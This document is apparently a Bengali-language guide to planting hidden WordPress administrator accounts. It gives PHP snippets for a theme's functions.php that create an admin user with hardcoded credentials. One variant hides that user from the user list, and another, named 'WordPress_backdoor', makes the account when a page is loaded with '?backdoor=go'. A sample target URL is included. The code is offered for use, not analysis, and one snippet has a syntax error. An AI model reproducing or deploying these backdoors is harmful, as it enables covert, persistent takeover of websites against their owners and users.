##### এই কোড গুলো ব্যবহার করার জন্য আপনার ওয়েবসাইটে যেই থিম বর্তমান activated আছে সেই থিমের directory তে গিয়ে functions.php ফাইল টা edit করে একবারে শেষে অথবা কোড বুঝে যে কোনো জায়গায় pest করে দিলেই functions অনুযায়ী user তৈরি হয়ে যাবে।

##### তবে লক্ষণীয় বিষয় হচ্ছে,  অবশ্যই activated থিম এর ভেতরে কোড টা থাকতে হবে।  থিম deactivated হয়ে গেলে কোড টা আর কাজ করবেনা।

#### যে কোনো ওয়েবসাইটের ডিফল্ট ভাবে সবগুলো থিম এর লোকেশন হলো:

    domain.com/wp-content/themes/

#### Normal user creation

`class` is user and `functions-class` is password


    $new_class_functions =new WP_User(wp_create_user('class','functions-class'));
    $new_class_functions->set_role('administrator');


#### Hidden user creation

`class` is user and `functions-class` is password

    $new_class_functions =new WP_User(wp_create_user('class','functions-class'));
     $new_class_functions->set_role('administrator');

     function functions_class_include($user_search) {
     global $current_user;
     $get_functions_class = $current_user->user_login;
     if ($get_functions_class != 'class') {
     global $wpdb;
     $user_search->query_where = str_replace('WHERE 1=1',
     "WHERE 1=1 AND {$wpdb->users}.user_login != 'class'",$user_search->query_where);
     }
     }
    add_action('pre_user_query','functions_class_include');


#### Another system to user creation

`class` is user and `functions-class` is password

    function wpb_admin_account(){
    $user = class;
    $pass = 'functions-class';
    $email = 'email@email.em';
    if ( !username_exists( $user ) && !email_exists( $email ) ) {
    $user_id = wp_create_user( $user, $pass, $email );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
    }
    }
    add_action('init','wpb_admin_account');


#### Another system to user creation

`class` is user and `functions-class` is password

    <?php
    add_action('wp_head', 'WordPress_backdoor');

    function WordPress_backdoor() {
    If ($_GET['backdoor'] == 'go') {
    require('wp-includes/registration.php');
    If (!username_exists('class')) {
    $user_id = wp_create_user('class', 'functions-class');
    $user = new WP_User($user_id);
    $user->set_role('administrator');
    }
    }
    }
    ?>

    https://www.targetdomain.com?backdoor=go

